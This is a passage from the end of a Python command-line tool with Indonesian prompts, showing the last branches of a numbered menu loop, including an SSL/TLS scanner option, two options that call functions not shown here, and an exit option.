            scan_result = ssl_scan(url)
            print(colored("\nHasil SSL / TLS Scanner:", 'yellow'))
            print(scan_result)
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "30":
            hitam_banget()
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == '31':
            menu_jamal_bin_asep()
            input(colored("\nTekan Enter untuk kembali ke Menu...", 'yellow'))
        elif menu_choice == "666":
            print(colored("Haik! Keluar dari Program...", 'white'))
            break
        else:
            print(colored("Terjadi kesalahan! Menu yang di input salah.", 'red'))

if __name__ == "__main__":
    main_menu()
